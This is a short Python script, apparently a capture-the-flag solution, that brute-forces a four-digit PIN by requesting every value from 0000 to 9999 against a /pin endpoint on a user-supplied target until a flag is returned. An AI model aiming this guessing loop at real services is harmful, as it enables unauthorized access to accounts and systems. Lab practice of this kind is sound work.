import requests

ip = "xxx"  # Your target IP
port = xxx           # Your target port

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")
    
    try:
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
        data = response.json()
        if 'flag' in data:
            print(f"Correct PIN found: {formatted_pin}")
            print(f"Flag: {data['flag']}")
            break
    except ValueError:
        # Response not JSON
        continue
    except requests.RequestException as e:
        print(f"Request error: {e}")
        break

